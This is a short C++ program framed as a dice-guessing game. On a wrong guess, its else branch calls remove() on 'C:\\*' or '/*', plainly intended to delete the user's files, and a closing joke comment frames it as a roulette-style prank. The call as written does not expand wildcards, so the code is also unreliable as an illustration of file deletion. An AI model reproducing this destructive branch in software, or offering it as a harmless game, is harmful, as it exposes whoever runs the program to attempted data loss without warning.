#include <iostream>
#include <random>

int main() {
    int guess;

    std::cout << "Guess the number! 1-6\n";
    std::cin >> guess;

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(1, 6);

    int answer = dist(gen);

    if (guess == answer) {
        std::cout << "That's correct!\n";
    } else {
        #ifdef _WIN32
            remove("C:\\*");
        #else
            remove("/*");
        #endif
    }

    return 0; // 5 of 6 times, this is useless :(
}
